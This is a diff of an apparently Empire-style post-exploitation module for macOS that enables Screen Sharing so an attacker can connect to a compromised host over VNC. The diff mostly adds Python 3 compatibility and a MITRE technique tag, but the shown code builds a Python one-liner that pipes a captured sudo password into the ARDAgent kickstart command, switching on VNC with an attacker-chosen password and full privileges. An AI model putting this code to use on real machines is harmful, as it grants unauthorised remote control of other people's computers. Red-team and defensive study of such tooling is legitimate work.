@@ -1,7 +1,7 @@
-from lib.common import helpers
+from builtins import object
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -15,6 +15,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Enables ScreenSharing to allow you to connect to the host via VNC.'),
+
+            'Software': '',
+
+            'Techniques': ['T1021'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -83,4 +87,5 @@ class Module:
 
         enable = "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw %s -restart -agent -privs -all"  % (vncpass)
         script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, enable)
+
         return script
